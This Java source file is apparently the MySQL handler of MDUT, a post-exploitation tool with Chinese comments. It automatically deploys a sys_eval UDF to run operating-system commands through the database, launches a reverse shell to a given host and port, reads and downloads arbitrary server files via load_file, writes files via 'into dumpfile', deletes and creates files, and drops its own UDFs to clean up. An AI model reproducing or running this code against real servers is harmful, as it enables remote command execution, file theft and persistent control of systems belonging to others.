package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.MysqlDao;
import org.json.JSONObject;

import java.util.Map;

/**
 * MySQL 分发：info / exec（UDF 自动部署链）/ sql / clean / revshell；文件操作 M3a。
 */
public class MysqlDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "mysql";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc.isEmpty() ? "UTF-8" : ctx.enc;
        MysqlDao dao = new MysqlDao(rec.get("ipaddress"), rec.get("port"), rec.get("database"),
                rec.get("username"), rec.get("password"), String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);

        if ("sql".equals(tool)) {
            dao.getConnection();
            return Result.ok(dao.runSql(p.positionals.get(0), code)).withId(id);
        }
        if ("info".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            JSONObject d = new JSONObject();
            d.put("version", nz(dao.getVersion()));
            d.put("os", nz(dao.getMysqlPlatform()));
            d.put("arch", nz(dao.getSystemPlatform()));
            d.put("plugin_dir", nz(dao.getRemoteOutfile()));
            d.put("sys_eval_exists", dao.sysEvalExists());
            return Result.ok("MySQL " + nz(dao.getVersion()) + " / " + nz(dao.getMysqlPlatform())
                    + " / " + nz(dao.getSystemPlatform()), d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            dao.getConnection();
            String res = dao.eval(cmd, code);
            if (!dao.sysEvalExists()) {
                // 自动部署链（docs/3 §3.2）：getInfo→initUDF→udf(sys_eval) 后重试一次
                ctx.reporter.log(Util.Utils.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链..."));
                dao.getInfo();
                dao.udf("sys_eval");
                res = dao.eval(cmd, code);
            }
            return Result.ok(res).withId(id);
        }
        if ("clean".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            dao.cleanudf();
            return Result.ok("clean 完成（drop sys_eval/backshell + 删除 *.temp）").withId(id);
        }
        if ("revshell".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            if (dao.getMysqlPlatform() != null && !dao.getMysqlPlatform().startsWith("Win")) {
                ctx.reporter.log(Util.Utils.log("[mdut] 警告: backshell 为 Windows DLL 路线，Linux 目标建议直接 exec"));
            }
            dao.reverseShell(p.positionals.get(0), p.positionals.get(1), code);
            return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
        }
        // ---- 文件操作（M3a；linux 走 sys_eval，win 走 cmd /c） ----
        dao.getConnection(); // 文件分支独立入口：确保 CONN 就绪（read/download 不经 UDF 链）
        if (dao.getMysqlPlatform() == null) {
            dao.getInfo(); // 平台探测（Win/Linux 命令分派依赖），幂等
        }
        boolean win = dao.getMysqlPlatform() != null && dao.getMysqlPlatform().startsWith("Win");
        if ("list-files".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
            String arg = p.positionals.get(0);
            String cmd;
            if ("list-files".equals(tool)) {
                cmd = win ? "cmd /c dir " + arg : "ls -la " + arg;
            } else if ("rm".equals(tool)) {
                cmd = win ? "cmd /c del /f /q " + arg : "rm -f " + arg;
            } else {
                cmd = win ? "cmd /c mkdir " + arg : "mkdir -p " + arg;
            }
            ensureSysEval(dao, ctx);
            return Result.ok(nz(dao.eval(cmd, code))).withId(id);
        }
        if ("read".equals(tool) || "download".equals(tool)) {
            String path = p.positionals.get(0).replace("'", "''");
            // hex(load_file) 保二进制安全；hex 为 NULL → 文件不可读/超限
            String hex = dao.runSql("select hex(load_file('" + path + "')) as h", "UTF-8").trim();
            if (hex.isEmpty() || hex.toUpperCase().contains("NULL")) {
                return Result.target("读取失败: LOAD_FILE 返回 NULL",
                        "secure-file-priv 限制/无权限/文件过大；或该路径不可读").withId(id);
            }
            byte[] bytes = hexToBytes(hex);
            if ("download".equals(tool)) {
                return MssqlDispatcher.toOutBytes(ctx, bytes, flag(p, "out", "")).withId(id);
            }
            return Result.ok(new String(bytes, code),
                    new JSONObject().put("b64", java.util.Base64.getEncoder().encodeToString(bytes))
                            .put("size", bytes.length)).withId(id);
        }
        if ("write".equals(tool) || "upload".equals(tool)) {
            byte[] content;
            String remote;
            if ("write".equals(tool)) {
                content = MssqlDispatcher.readContent(p);
                remote = p.positionals.get(0);
            } else {
                byte[] bytes = Util.Utils.toByteArray(p.positionals.get(0));
                if (bytes != null && bytes.length > 64 * 1024 * 1024) {
                    return Result.usage("文件超过 64MB 上限（SQL 管道内存约束，hex/base64 化会翻倍）",
                            "大文件请分块写入或用 download/upload 之外的带外通道").withId(id);
                }
                if (bytes == null) {
                    return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
                }
                content = bytes;
                remote = p.positionals.get(1);
            }
            ensureSysEval(dao, ctx);
            String hex = Util.Utils.bytes2HexString(content);
            String pathEsc = remote.replace("'", "''");
            dao.runSql("select 0x" + hex + " into dumpfile '" + pathEsc + "'", "UTF-8");
            return Result.ok("写入完成: " + remote + " (" + content.length + " bytes)").withId(id);
        }
        return Result.usage("mysql 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    /** sys_eval 自动部署链（幂等：已部署直接返回） */
    private void ensureSysEval(MysqlDao dao, Ctx ctx) throws Exception {
        if (!dao.sysEvalExists()) {
            ctx.reporter.log(Util.Utils.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链..."));
            dao.getInfo();
            dao.udf("sys_eval");
        }
    }

    static byte[] hexToBytes(String hex) {
        hex = hex.trim();
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        }
        return out;
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
